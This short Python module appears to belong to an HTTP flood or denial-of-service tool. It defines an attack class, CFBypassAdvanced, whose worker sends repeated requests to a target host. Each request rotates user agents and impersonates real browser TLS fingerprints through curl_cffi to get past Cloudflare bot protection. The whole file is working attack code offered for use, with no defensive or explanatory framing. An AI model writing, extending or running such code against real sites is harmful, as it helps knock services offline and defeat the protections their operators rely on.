# attacks/cf_bypass_advanced.py
from curl_cffi import requests
import random
from .base import AttackBase

class CFBypassAdvanced(AttackBase):
    IMPERSONATES = ["chrome110", "chrome120", "firefox110", "safari15_5"]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.session = requests.Session()

    def worker(self):
        impersonate = random.choice(self.IMPERSONATES)
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        try:
            r = self.session.get(
                f"https://{self.target}:{self.port}/",
                headers=headers,
                impersonate=impersonate,
                timeout=10
            )
            return len(r.content)
        except:
            return 0